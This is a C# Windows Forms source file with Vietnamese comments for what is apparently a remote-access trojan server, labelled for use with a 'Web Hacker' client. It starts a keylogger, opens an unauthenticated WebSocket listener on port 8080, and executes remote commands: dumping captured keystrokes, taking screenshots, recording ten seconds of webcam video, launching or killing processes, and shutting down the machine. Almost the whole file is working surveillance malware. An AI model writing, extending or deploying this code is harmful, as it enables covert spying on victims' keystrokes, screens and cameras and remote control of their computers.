using System;
using System.Windows.Forms;
using System.Net;
using System.Net.WebSockets; // QUAN TRỌNG: Thư viện WebSocket
using System.IO;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text;
using KeyLogger; // Đảm bảo namespace này khớp với file Keylog.cs

namespace server
{
    public partial class server : Form
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        public server() { InitializeComponent(); CheckForIllegalCrossThreadCalls = false; }

        private void button1_Click(object sender, EventArgs e)
        {
            // 1. KÍCH HOẠT KEYLOG
            Thread tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
            tklog.SetApartmentState(ApartmentState.STA); tklog.Start();

            // 2. KÍCH HOẠT WEBSOCKET SERVER
            Task.Run(() => StartWebSocketServer());

            button1.Text = "SERVER ĐANG CHẠY..."; button1.Enabled = false;

            // Lấy IP để hiển thị
            string ip = "127.0.0.1";
            try
            {
                foreach (var i in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                    if (i.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork) { ip = i.ToString(); break; }
            }
            catch { }
            MessageBox.Show($"Server OK!\nIP: {ip}\nNhập IP này vào Web Hacker.");
        }

        private async Task StartWebSocketServer()
        {
            HttpListener listener = new HttpListener();
            listener.Prefixes.Add("http://*:8080/"); // Mở cổng 8080
            try { listener.Start(); } catch { MessageBox.Show("LỖI: Phải chạy Run As Administrator!"); return; }

            while (true)
            {
                HttpListenerContext ctx = await listener.GetContextAsync();
                if (ctx.Request.IsWebSocketRequest) ProcessWs(ctx); // Nếu là WebSocket thì xử lý
                else { ctx.Response.StatusCode = 400; ctx.Response.Close(); }
            }
        }

        private async void ProcessWs(HttpListenerContext ctx)
        {
            HttpListenerWebSocketContext wsCtx = await ctx.AcceptWebSocketAsync(null);
            WebSocket ws = wsCtx.WebSocket;
            byte[] buf = new byte[1024 * 5000]; // Buffer lớn để nhận ảnh/video

            while (ws.State == WebSocketState.Open)
            {
                try
                {
                    WebSocketReceiveResult res = await ws.ReceiveAsync(new ArraySegment<byte>(buf), CancellationToken.None);
                    if (res.MessageType == WebSocketMessageType.Close) break;

                    string cmd = Encoding.UTF8.GetString(buf, 0, res.Count);
                    string reply = Exec(cmd); // Thực thi lệnh

                    byte[] outBuf = Encoding.UTF8.GetBytes(reply);
                    await ws.SendAsync(new ArraySegment<byte>(outBuf), WebSocketMessageType.Text, true, CancellationToken.None);
                }
                catch { break; }
            }
        }

        // XỬ LÝ LỆNH TỪ WEB CLIENT
        private string Exec(string cmd)
        {
            try
            {
                string[] p = cmd.Split('|');
                switch (p[0])
                {
                    case "SHUTDOWN": Process.Start("shutdown", "/s /t 0"); return "LOG: Đang tắt...";
                    case "RESTART": Process.Start("shutdown", "/r /t 0"); return "LOG: Đang restart...";
                    case "KEYLOG":
                        string l = ""; lock (KeyLogger.appstart.logLock) { l = KeyLogger.appstart.logBuffer.ToString(); }
                        return "KEYLOG|" + l;
                    case "LIST_APP": return "LIST_APP|" + GetProcs();
                    case "START": Process.Start(p[1]); return "LOG: Đã mở " + p[1];
                    case "KILL": Process.GetProcessById(int.Parse(p[1])).Kill(); return "LOG: Đã diệt " + p[1];
                    case "SCREENSHOT": return "IMG|" + Convert.ToBase64String(CapScreen());
                    case "WEBCAM":
                        string v = RecVid(10);
                        if (File.Exists(v)) { byte[] b = File.ReadAllBytes(v); File.Delete(v); return "VID|" + Convert.ToBase64String(b); }
                        return "LOG: Lỗi Webcam";
                }
            }
            catch (Exception ex) { return "LOG: Lỗi " + ex.Message; }
            return "";
        }

        string GetProcs()
        {
            StringBuilder sb = new StringBuilder();
            foreach (Process p in Process.GetProcesses())
                if (!string.IsNullOrEmpty(p.MainWindowTitle)) sb.Append($"{p.Id},{p.MainWindowTitle};");
            return sb.ToString();
        }

        byte[] CapScreen()
        {
            Rectangle b = Screen.PrimaryScreen.Bounds;
            using (Bitmap bmp = new Bitmap(b.Width, b.Height))
            using (Graphics g = Graphics.FromImage(bmp)) using (MemoryStream ms = new MemoryStream())
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, b.Size); bmp.Save(ms, ImageFormat.Jpeg); return ms.ToArray();
            }
        }

        string RecVid(int s)
        {
            try
            {
                string p = Path.Combine(Application.StartupPath, "rec.avi");
                if (File.Exists(p)) File.Delete(p);
                mciSendString("open new type avivideo alias myvideo", null, 0, 0);
                mciSendString("record myvideo", null, 0, 0);
                Thread.Sleep(s * 1000);
                mciSendString("save myvideo \"" + p + "\"", null, 0, 0);
                mciSendString("close myvideo", null, 0, 0);
                return p;
            }
            catch { return ""; }
        }
    }
}